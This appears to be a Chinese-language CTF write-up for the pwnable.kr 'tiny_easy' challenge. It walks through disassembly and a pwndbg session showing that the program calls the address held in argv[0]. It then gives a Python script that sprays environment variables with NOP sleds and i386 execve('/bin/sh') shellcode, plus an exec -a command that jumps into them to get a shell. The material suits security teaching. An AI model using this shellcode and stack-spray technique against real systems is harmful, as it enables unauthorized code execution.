---
layout: post
title: pwnable.kr tiny_easy
date: 2024-12-31 14:57 +0800
---
## 题目描述
题目文件只有90字节，拖IDA看一下。

```
LOAD:08048054 ; =============== S U B R O U T I N E =======================================
LOAD:08048054
LOAD:08048054 ; Attributes: noreturn
LOAD:08048054
LOAD:08048054                 public start
LOAD:08048054 start           proc near               ; DATA XREF: LOAD:08048018↑o
LOAD:08048054                 pop     eax
LOAD:08048055                 pop     edx
LOAD:08048056                 mov     edx, [edx]
LOAD:08048058                 call    edx
LOAD:08048058 start           endp ; sp-analysis failed
LOAD:08048058
LOAD:08048058 LOAD            ends
LOAD:08048058
LOAD:08048058
LOAD:08048058                 end start
```

直接运行会断错误，gdb挂上去，发现edx是文件名的前四个字节`/roo`,这说明如果能控制文件名就能任意地址跳转

```
pwndbg> b *0x08048058
Breakpoint 1 at 0x8048058
pwndbg> r
Starting program: /root/tiny_easy

Breakpoint 1, 0x08048058 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────
 EAX  1
 EBX  0
 ECX  0
 EDX  0x6f6f722f ('/roo')
 EDI  0
 ESI  0
 EBP  0
 ESP  0xffffd618 ◂— 0
 EIP  0x8048058 ◂— call edx
──────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────
 ► 0x8048058    call   edx                         <0x6f6f722f>

   0x804805a    add    byte ptr [eax], al
   0x804805c    add    byte ptr [eax], al
   0x804805e    add    byte ptr [eax], al
   0x8048060    add    byte ptr [eax], al
   0x8048062    add    byte ptr [eax], al
   0x8048064    add    byte ptr [eax], al
   0x8048066    add    byte ptr [eax], al
   0x8048068    add    byte ptr [eax], al
   0x804806a    add    byte ptr [eax], al
   0x804806c    add    byte ptr [eax], al
──────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────
00:0000│ esp 0xffffd618 ◂— 0
01:0004│     0xffffd61c —▸ 0xffffd771 ◂— 'LC_TERMINAL_VERSION=3.5.4'
02:0008│     0xffffd620 —▸ 0xffffd78b ◂— 'LANG=en_US.UTF-8'
03:000c│     0xffffd624 —▸ 0xffffd79c ◂— 'LC_TERMINAL=iTerm2'
04:0010│     0xffffd628 —▸ 0xffffd7af ◂— 'USER=root'
05:0014│     0xffffd62c —▸ 0xffffd7b9 ◂— 'LOGNAME=root'
06:0018│     0xffffd630 —▸ 0xffffd7c6 ◂— 'HOME=/root'
07:001c│     0xffffd634 —▸ 0xffffd7d1 ◂— 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin'
────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────
 ► 0 0x8048058 None
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
     Start        End Perm     Size Offset File
 0x8048000  0x8049000 r-xp     1000      0 /root/tiny_easy
0xf7ff8000 0xf7ffc000 r--p     4000      0 [vvar]
0xf7ffc000 0xf7ffe000 r-xp     2000      0 [vdso]
0xfffdd000 0xffffe000 rwxp    21000      0 [stack]
```

控制文件名需要用到exec,
`exec -a 'fake_name' ./tiny_easy &`
那么跳转到什么地方呢？
调试时，我们发现栈上有很多环境变量，因此如果栈上都布置上我们的shellcode，显然就会有很大的概率撞到我们的shellcode。
引入堆喷洒的思路，可以用大量的`[NOP][NOP][NOP][NOP][NOP][NOP][shellcode]`到栈上。

exp如下：
```python
with open('exp.sh', 'wb') as f:
	for i in range(500):
		f.write(b'export ' +  b"exp_" + str(i).encode() + b"=$(python -c 'print \"\\x90\"*4096+\"jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80\"')\n")
```

我们可以在目标机器上执行这些命令，然后gdb挂上去看大部分shellcode的位置
```bash
exec -a $(printf "\xd1\xd1\xd1\xff") /home/tiny_easy/tiny_easy
```
执行3～5次即可getshell。